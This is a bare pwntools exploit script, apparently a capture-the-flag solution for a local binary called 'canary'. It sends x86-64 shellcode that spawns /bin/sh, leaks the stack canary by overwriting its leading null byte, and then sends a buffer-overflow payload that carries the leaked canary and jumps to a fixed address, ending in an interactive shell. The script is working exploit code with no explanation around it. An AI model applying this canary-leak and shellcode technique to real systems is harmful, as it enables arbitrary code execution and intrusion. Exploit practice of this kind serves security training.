from pwn import *

p = process('./canary')

p.recvuntil(b'name: ')
p.send(b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05')
p.recvline()
offset = b'a' * 0x19
p.send(offset)
p.recvline()
canary = b'\x00' + p.recvline()[0x19:-1]
print(canary)
p.recvline()
payload = b'a' * 0x18 + canary + p64(0) + p64(0x410000)
p.send(payload)

p.interactive()
